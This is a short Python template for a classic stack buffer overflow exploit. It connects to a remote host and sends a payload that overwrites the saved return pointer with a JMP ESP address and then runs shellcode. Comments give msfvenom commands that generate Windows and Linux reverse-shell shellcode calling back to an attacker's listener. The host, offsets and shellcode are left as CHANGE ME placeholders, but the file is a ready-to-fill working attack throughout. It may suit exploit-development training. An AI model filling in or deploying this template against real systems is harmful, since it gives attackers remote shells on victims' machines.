#!/usr/bin/env python3

import socket
import struct

# Config
RHOST = ""  # CHANGE ME
RPORT = 0   # CHANGE ME

# Create a TCP socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buffer_length = 1024
offset_srp = 0                  # CHANGE ME | SRP = Saved Returned Pointer
jmp_esp_pointer = 0x00          # CHANGE ME
sub_esp = b"\x00\x00\x00"       # CHANGE ME


# Arbitrary shellcode
#
# msfvenom for shellcode generation
# WINDOWS:
#   msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> 
#       -f python --var-name shellcode EXITFUNC=thread -b '\x00\x0A'
#
# LINUX:
#   msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> 
#       -f python --var-name shellcode EXITFUNC=thread -b '\x00\x0A'
shellcode =  b""


# Build payload
payload = b""
payload += b"A" * (offset_srp - len(payload))    # Padding
payload += struct.pack("<I", jmp_esp_pointer)    # SRP overwrite
payload += sub_esp                               # ESP should end up pointing here
payload += shellcode 
payload += b"D" * (buffer_length - len(payload)) # Trailing padding
payload += b"\n"

# Send payload
s.send(payload)
